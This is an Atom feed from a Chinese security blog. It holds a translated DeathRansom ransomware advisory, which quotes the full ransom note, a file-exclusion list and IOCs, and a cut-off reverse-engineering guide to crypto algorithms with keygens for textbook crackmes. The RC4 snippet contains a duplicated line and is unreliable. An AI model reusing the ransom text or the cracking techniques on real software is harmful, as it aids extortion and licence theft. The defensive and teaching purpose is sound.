<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>偽のブログ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xwdidi.top/"/>
  <updated>2019-11-28T14:45:35.703Z</updated>
  <id>http://xwdidi.top/</id>
  
  <author>
    <name>Xuwei98</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DeathRansom勒索病毒预警</title>
    <link href="http://xwdidi.top/2019/11/28/2019-11-28-DeathRansom%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E9%A2%84%E8%AD%A6/"/>
    <id>http://xwdidi.top/2019/11/28/2019-11-28-DeathRansom勒索病毒预警/</id>
    <published>2019-11-27T16:00:00.000Z</published>
    <updated>2019-11-28T14:45:35.703Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="新勒索软件DeathRansom开始成名"><a href="#新勒索软件DeathRansom开始成名" class="headerlink" title="新勒索软件DeathRansom开始成名"></a>新勒索软件DeathRansom开始成名</h1><p><img src="https://www.bleepstatic.com/content/hl-images/2019/11/25/skull-ransom-encrypt.jpg" alt></p><p>新的勒索软件<code>DeathRansom</code>伴随着坎坷的开始,但是现在已经解决了问题,并且开始感染受害者和加密他们的数据.</p><p>当<code>DeathRansom</code>第一次开始散播的时候,它假装的去加密文件,但是研究者和使用者发现他们可以删除后缀位<code>.wctc</code>的扩展,文件将能再次使用.</p><p>在9月20号左右开始发生,不过,有些事情改变了.</p><p>不仅受害者的文件被加密了,而且在<a href="https://id-ransomware.malwarehunterteam.com/" target="_blank" rel="noopener">ID Ransomware</a>勒索软件ID提交网站上关于<code>DeathRansom</code>的提交大量出现</p><p><img src="https://www.bleepstatic.com/images/news/ransomware/d/deathransom/chart.jpg" alt></p><p>​                                                                        <strong>DeathRansom Submissions</strong></p><p>从初始的激增来看人数有所减少,我们仍然看见源源不断的受害者出现,这意味着仍然有可能传播活动仍在进行中.</p><p>不幸运的是,我们仍然没有发现这些勒索软件是如何传播的.</p><p>我们仍然知道的是像其他勒索软件一样,当<code>DeathRansom</code>启动时将会试图清除卷影副本.</p><p>它将会加密所有受害者计算机上的所有文件除了全路径上包括下面的字符的文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">programdata</span><br><span class="line">$recycle.bin</span><br><span class="line">program files</span><br><span class="line">windows</span><br><span class="line">all users</span><br><span class="line">appdata</span><br><span class="line">read_me.txt</span><br><span class="line">autoexec.bat</span><br><span class="line">desktop.ini</span><br><span class="line">autorun.inf</span><br><span class="line">ntuser.dat</span><br><span class="line">iconcache.db</span><br><span class="line">bootsect.bak</span><br><span class="line">boot.ini</span><br><span class="line">ntuser.dat.log</span><br><span class="line">thumbs.db</span><br></pre></td></tr></table></figure><p>与之前的非加密版本不同,正在使用的<code>DeathRansom</code>变体不会附加扩展去加密文件并且它会保持文件名.其中的数据在文件中是被加密的.</p><p><img src="https://www.bleepstatic.com/images/news/ransomware/d/deathransom/hex-edit.jpg" alt="Encrypted File"></p><p>只有一个方式去识别被<code>DeathRansom</code>加密后的文件,通过文件标记查看被加密文件末尾的<code>ABEFCDAB</code> </p><p><img src="https://www.bleepstatic.com/images/news/ransomware/d/deathransom/file-marker.jpg" alt></p><p>​                                                                                    <strong>File marker</strong></p><p>在每个被加密的文件的文件夹中,勒索病毒将会创建一个叫做<code>read_me.txt</code>的勒索文本,里面包含着受害者的<code>LOCK-ID</code>和联系勒索病毒开发者的邮件地址.</p><p><img src="https://www.bleepstatic.com/images/news/ransomware/d/deathransom/ransom-note.jpg" alt></p><p>勒索病毒目前还在分析中并且不知道是否可以解密.</p><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash:"></a>Hash:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ab828f0e0555f88e3005387cb523f221a1933bbd7db4f05902a1e5cc289e7ba4</span><br></pre></td></tr></table></figure><h3 id="Ransom-note-text"><a href="#Ransom-note-text" class="headerlink" title="Ransom note text:"></a>Ransom note text:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  ?????????????????????????</span><br><span class="line">??????DEATHRansom ???????</span><br><span class="line">?????????????????????????</span><br><span class="line">Hello dear friend,</span><br><span class="line">Your files were encrypted!</span><br><span class="line">You have only 12 hours to decrypt it</span><br><span class="line">In case of no answer our team will delete your decryption password</span><br><span class="line">Write back to our e-mail: deathransom@airmail.cc</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">In your message you have to write:</span><br><span class="line">1. YOU LOCK-ID: XXX</span><br><span class="line">2. Time when you have paid 0.1 btc to this bitcoin wallet:</span><br><span class="line">xxx</span><br><span class="line"> </span><br><span class="line">After payment our team will decrypt your files immediatly</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Free decryption as guarantee:</span><br><span class="line">1. File must be less than 1MB</span><br><span class="line">2. Only .txt or .lnk files, no databases</span><br><span class="line">3. Only 1 files</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">How to obtain bitcoin:</span><br><span class="line">The easiest way to buy bitcoins is LocalBitcoins site. You have to register, click &apos;Buy bitcoins&apos;, and select the seller by payment method and price.</span><br><span class="line">https://localbitcoins.com/buy_bitcoins</span><br><span class="line">Also you can find other places to buy Bitcoins and beginners guide here:</span><br><span class="line">http://www.coindesk.com/information/how-can-i-buy-bitcoins/</span><br></pre></td></tr></table></figure><h3 id="Associated-emails"><a href="#Associated-emails" class="headerlink" title="Associated emails:"></a>Associated emails:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deathransom@airmail.cc</span><br></pre></td></tr></table></figure><h3 id="Network-connections"><a href="#Network-connections" class="headerlink" title="Network connections:"></a>Network connections:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://iplogger.org/1Zqq77</span><br></pre></td></tr></table></figure><h3 id="Registry-keys"><a href="#Registry-keys" class="headerlink" title="Registry keys:"></a>Registry keys:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Wacatac</span><br></pre></td></tr></table></figure><h4 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h4><p>翻译自<a href="https://www.bleepingcomputer.com/news/security/new-deathransom-ransomware-begins-to-make-a-name-for-itself/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/news/security/new-deathransom-ransomware-begins-to-make-a-name-for-itself/</a>文章.     </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="翻译" scheme="http://xwdidi.top/categories/%E7%BF%BB%E8%AF%91/"/>
    
    
      <category term="恶意软件" scheme="http://xwdidi.top/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>常用密码学不全概括总览</title>
    <link href="http://xwdidi.top/2019/11/22/2019-11-22-%E5%AF%86%E7%A0%81%E5%AD%A6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://xwdidi.top/2019/11/22/2019-11-22-密码学逆向分析/</id>
    <published>2019-11-21T16:00:00.000Z</published>
    <updated>2019-12-29T07:54:44.662Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>想作为分析勒索病毒前的密码学接触.</p><p>常用加解密算法的逆向分析中的识别,不做过多算法原理上的叙述,别人讲的好多了.站在巨人的肩膀上.</p><p>这篇文章只作为特征查找用来辅助平时分析用.</p><p>两种工具<code>ida</code>插件<code>FindCrypt2</code>和<code>peid</code>的<code>KANA</code>进行算法识别是很好用的.</p><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><h4 id="历史发展"><a href="#历史发展" class="headerlink" title="历史发展"></a>历史发展</h4><p><code>base64</code>最早就是用来邮件传输协议中的，原因是邮件传输协议只支持 <code>ascii</code> 字符传递，因此如果要传输二进制文件，如：图片、视频是无法实现的。因此 <code>base64</code>就可以用来将二进制文件内容编码为只包含 ascii 字符的内容，这样就可以传输了.</p><p>简单来说为了兼容各种数据格式.</p><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>采用每三字节置换为四字节的方式,<code>3x8</code>24位二进制转换为<code>4x6</code>的方式,前两位用<code>0</code>填充.字符不够转换的话,空字符<code>=</code>填充.(1字节或二字节输入,那么只能使用输出的2个或3个字符)</p><p>使用字符表<code>&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</code>置换</p><p><code>Base24</code>:<code>&quot;BCDFGHJKMPQmogRTVWXY2346789&quot;</code></p><p><code>Base32</code>:<code>&quot;ABCDEFGHJKLMNOPQRSTUVWXYZ234567&quot;</code></p><p><code>Base60</code>:<code>&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx&quot;</code></p><p><code>Base85</code>:<code>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&amp;&lt;&gt;()[]{}@%$#</code></p><h4 id="逆向初探"><a href="#逆向初探" class="headerlink" title="逆向初探"></a>逆向初探</h4><p><code>Findcrypt2</code>和<code>KANAL</code>都能是识别出置换表. </p><p>所以先关注置换表,然后关注下相关的位运算操作,可能就是<code>base</code>相关算法.</p><p>编码伪代码部分:<img src="https://i.loli.net/2019/11/08/CaoShdfTcil1xLW.png" alt="image.png"></p><h4 id="魔改Base64"><a href="#魔改Base64" class="headerlink" title="魔改Base64"></a>魔改Base64</h4><ol><li>置换表里的字符顺序变化或者修改置换表</li><li>将置换表分成几个不连续的部分,根据偏移进行对应的索取,或者进行加密.</li></ol><p>嘛 具体问题具体分析</p><h2 id="单向散列"><a href="#单向散列" class="headerlink" title="单向散列"></a>单向散列</h2><p>用的比较多的就是<code>MD5</code>和<code>SHA-1</code>等算法</p><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><p><a href="https://zhuanlan.zhihu.com/p/37257569" target="_blank" rel="noopener">这里</a>和加密与解密上都讲的挺好的,我做些我需要的东西的提炼</p><p><img src="https://gss0.bdstatic.com/-4o3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike80%2C5%2C5%2C80%2C26/sign=5f537e77f636afc31a013737d27080a1/c75c10385343fbf2ee0d9594b17eca8065388f67.jpg" alt="img"></p><ol><li><p>填充消息使其长度与<code>448 mod 512</code>同余,是为了后面填充<code>64</code>位的长度.</p><p>填充方法:附一个<code>1</code>在消息后面,然后用<code>0</code>填充,填充长度<code>0&lt;x&lt;=512</code></p></li><li><p>初始化最开始需要使用<code>0x67452301</code>,<code>0xefcdab89</code>,<code>0x98badcfe</code>,<code>0x10325476</code>进行初始化</p></li><li><p>然后进行数据处理,相关细节看书和源码就好.需要使用左移数组<code>{ 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7,12, 17, 22, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10,15, 21, 6, 10, 15, 21, 6, 10, 15, 21,, 6, 10, 15, 21 }</code>和</p><p>64个存放32位字节的加法常数数组,由<code>2^32 * (abs(sin(i)))</code>得出,<code>i</code>的范围<code>1</code>到<code>64</code>.</p><p><code>{ 0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501, 0x698098d8,0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193,0xa679438e, 0x49b40821, 0xf61e2562, 0xc040b340, 0x265e5a51,0xe9b6c7aa, 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905,0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a, 0xfffa3942, 0x8771f681,0x6d9d6122, 0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60,0xbebfbc70, 0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665, 0xf4292244,0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92,0xffeff47d, 0x85845dd1, 0x6fa87e4f, 0xfe2ce6e0, 0xa3014314,0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391 };</code></p></li><li><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F(x, y, z) (((x) &amp; (y)) | ((~(x)) &amp; (z)))  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> G(x, y, z) (((x) &amp; (z)) | ((y) &amp; (~(z))))  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H(x, y, z) ((x) ^ (y) ^ (z))  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> I(x, y, z) ((y) ^ ((x) | (~(z))))</span></span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>512位消息分组为<code>16组 x 32位</code>,进行<code>4*16</code>次运算</p></li><li><p>128位散列值。</p></li></ol><h4 id="逆向识别"><a href="#逆向识别" class="headerlink" title="逆向识别"></a>逆向识别</h4><p><code>FindCrypt2</code>和<code>peid</code>的<code>KANA</code>都是识别加法常数</p><p>采用加密与解密中的<code>MD5KeyGen.exe</code>进行分析学习</p><ol><li><p><img src="https://i.loli.net/2019/11/10/h2CZaKHMPu6p9vl.png" alt="image.png">寄存器初始化</p></li><li><p><code>MD5</code>计算部分伪代码<img src="https://i.loli.net/2019/11/10/QVRIb6XOxkTKGzd.png" alt="image.png"></p><p>每使用16个硬编码常量,都会发现算法的改变.详细算法看上面第四点</p></li><li><p>这样简单的确定了是<code>MD5</code>算法,然后可以从<img src="https://i.loli.net/2019/11/10/YFeQ9J8L6x5GEDB.png" alt="image.png">进行回溯,<code>ida</code>识别有点问题,汇编看了下二者相等.</p></li><li><p><img src="https://i.loli.net/2019/11/22/VXMLcphBqFvzYNG.png" alt="image.png"></p><p><code>v11</code>是置换表说明<code>v4</code>可能就是计算后的值,再动态调试可知,过滤掉前面的判断进行<code>MD5</code>计算的值为<img src="https://i.loli.net/2019/11/10/cUV7GDdPbOWICQp.png" alt="image.png"></p><p>说明在中途加了<code>www.pediy.com</code>字符串,</p></li><li><p><img src="https://i.loli.net/2019/11/10/Bm78Kk9AED2yVqO.png" alt="image.png"></p><p><code>sub_4012E0</code>集成了<code>字符串添加</code>和<code>拷贝的字符大小刚好等于原字符串差64位的大小时,拷贝并直接计算MD5的功能</code>.</p><p><img src="https://i.loli.net/2019/11/10/ScCuGxXalLbw29I.png" alt="image.png"></p></li><li><p>大概的流程差不多分析出来了,基本上修改下原版<code>MD5</code>的算法就能写出注册机了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str  = input()</span><br><span class="line">str +=<span class="string">'www.pediy.com'</span></span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.update(str.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">hash = hash.hexdigest()</span><br><span class="line">code = <span class="string">"23456789ABCDEFGHJKLMNPQRSTUVWXYZ"</span></span><br><span class="line">serial = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(hash),<span class="number">2</span>):</span><br><span class="line">a = <span class="string">'0x'</span> + hash[i]+hash[i+<span class="number">1</span>]</span><br><span class="line">serial = serial+code[eval(a)%<span class="number">32</span>]</span><br><span class="line">serial = serial[:<span class="number">4</span>] + <span class="string">'-'</span> + serial[<span class="number">4</span>:<span class="number">8</span>] +<span class="string">'-'</span> + serial[<span class="number">8</span>:<span class="number">12</span>] +<span class="string">'-'</span>+serial[<span class="number">12</span>:<span class="number">16</span>]</span><br><span class="line">print(serial)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/10/6LqRjmJ5ztACE3U.png" alt="image.png"></p></li></ol><h4 id="魔改"><a href="#魔改" class="headerlink" title="魔改"></a>魔改</h4><ol><li>可能会改变四个常数</li><li>改变输入后的字符,添加或者做某些运算等等</li><li>hash处理过程可能改变</li></ol><h3 id="SHA算法"><a href="#SHA算法" class="headerlink" title="SHA算法"></a>SHA算法</h3><p>散列值长度:<code>SHA-1</code> 160位     <code>SHA-256</code>256位     <code>SHA-384</code>  384位    <code>SHA-512</code>512位</p><p><code>SHA-2</code>包括<code>SHA-224</code>、<code>SHA-256</code>、<code>SHA-384</code>、<code>SHA-512</code>、<code>SHA-512/224</code>、<code>SHA-512/256</code></p><h4 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h4><p>原理参考:<a href="https://www.wosign.com/News/news_2018121101.htm" target="_blank" rel="noopener">https://www.wosign.com/News/news_2018121101.htm</a> 讲的很详细</p><h4 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h4><ol><li><p>消息填充和<code>MD5</code>一样,512位为一组,然后<code>16组x32位</code>,然后扩充位<code>80组x32位</code>,进行<code>4*20</code>次运算</p></li><li><p>使用该函数进行计算<code>A,B,C,D,E←[(A&lt;&lt;5)+ ft(B,C,D)+E+Wt+Kt],A,(B&lt;&lt;30),C,D</code>,<code>f</code>函数伪代码在下方</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F0(x,y,z) ((x&amp;y)|((~x)&amp;z))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F1(x,y,z) (x^y^z)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F2(x,y,z) ((x&amp;y) | (x&amp;z)|(y&amp;z)) </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F3(x,y,z) (x^y^z)</span></span><br></pre></td></tr></table></figure></li><li><p>使用常数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> K0 0x5a827999L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> K1 0x6ed9eba1L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> K2 0x8f1bbcdcL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> K3 0xca62c1d6L</span></span><br></pre></td></tr></table></figure><p>初始化寄存器的<code>hash</code>值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H0 0x67452301L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H1 0xefcdab89L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H2 0x98badcfeL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H3 0x10325476L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H4 0xc3d2e1f0L</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="逆向初探SHA-1加密"><a href="#逆向初探SHA-1加密" class="headerlink" title="逆向初探SHA-1加密"></a>逆向初探SHA-1加密</h4><p>使用加密与解密的<code>6.1.2</code>示例程序</p><ol><li><p><code>FindCrypt</code>插件识别出<code>SHA-1</code>常量</p><p><img src="https://i.loli.net/2019/11/11/ngTjxvOpDtCs2HP.png" alt="image.png"></p></li><li><p>对输入进行判断,<code>Name</code>不为空,<code>Serial</code>为20位</p><p><img src="https://i.loli.net/2019/11/11/VP3nxkvYQeytmfg.png" alt="image.png"></p></li><li><p>基本流程<img src="https://i.loli.net/2019/11/11/PRt8sFC52yKd1Tc.png" alt="image.png"></p></li><li><p>注册机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">output = []</span><br><span class="line">str = input()</span><br><span class="line">hash = hashlib.sha1()</span><br><span class="line">hash.update(str.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">hash = hash.hexdigest()</span><br><span class="line">xor_str_1 = [<span class="number">0x50</span>,<span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x59</span>, <span class="number">0x20</span>, <span class="number">0x46</span>, <span class="number">0x6F</span> ,<span class="number">0x72</span> ,<span class="number">0x75</span>, <span class="number">0x6D</span>, <span class="number">0x00</span> ]</span><br><span class="line">xor_str_2 = <span class="string">"pediy.com"</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="comment"># print(hash)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">34</span>,<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">22</span>:</span><br><span class="line">b = <span class="string">'0x'</span> + (hash[i] + hash [i+<span class="number">1</span>])</span><br><span class="line">a = eval(b) ^ eval(output[int((i/<span class="number">2</span>))<span class="number">-12</span>])</span><br><span class="line">output.append(hex(a))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">b = <span class="string">'0x'</span> + (hash[i] + hash [i+<span class="number">1</span>])</span><br><span class="line">a = eval(b) ^ (xor_str_1[int(i/<span class="number">2</span>)])</span><br><span class="line">output.append(hex(a))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">40</span>,<span class="number">2</span>):</span><br><span class="line">b = <span class="string">'0x'</span> + (hash[i] + hash [i+<span class="number">1</span>])</span><br><span class="line">a = eval(b) ^ ord(xor_str_2[int(i/<span class="number">2</span>)<span class="number">-17</span>])</span><br><span class="line">output.append(hex(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">output[<span class="number">10</span>+i] = hex(eval(output[i]) ^ eval(output[<span class="number">10</span>+i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">20</span>):</span><br><span class="line">print(<span class="string">'&#123;:0&gt;2&#125;'</span>.format((output[i][<span class="number">2</span>:]).upper()),end = <span class="string">""</span>)</span><br></pre></td></tr></table></figure><p>成功<img src="https://i.loli.net/2019/11/11/WfdHbolKMP5JyGO.png" alt="image.png"></p></li><li><p>计算函数的部分伪代码参考<img src="https://i.loli.net/2019/11/11/bwDx6eJOCWYrZSn.png" alt="image.png"></p></li></ol><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>要注意字节与位转换函数,不太熟悉容易迷惑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">&#123; <span class="comment">/* convert to bytes */</span></span><br><span class="line">    hash[i]=((sh-&gt;h[i/<span class="number">4</span>]&gt;&gt;(<span class="number">8</span>*(<span class="number">3</span>-i%<span class="number">4</span>))) &amp; <span class="number">0xff</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>RC4生成一种被称为<code>密钥流</code>的伪随机流.它与加密的数据长度相等.密钥流与数据同位异或进行加解密.密钥流生成分为两个部分KSA与PRGA.</p><ol><li><p>the key-scheduling Algorithm (KSA) 密钥调度算法</p><p>按照升序<code>0,1,2,3,4.....,254,255</code>初始化一个256字节数组<code>S</code>.</p><p>使用密钥填充一个256字节数组<code>T</code> ,长度不够的话,轮转填入,直到填满.</p><p>对数组<code>S</code>进行打乱.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">    j =(j+S[i]+T[i])%<span class="number">256</span>;</span><br><span class="line">    swap(S[i],S[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>the Pseudo-Random Generation Algorithm  (PRGA) 伪随机生成算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (data_length--) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">swap(S[i], S[j]);</span><br><span class="line"><span class="keyword">int</span> t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line"><span class="keyword">int</span> k = S[t];</span><br><span class="line"><span class="comment">//k为加密密钥,直接进行与数据异或或者存进数组里最后进行异或都可以,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>函数完整代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 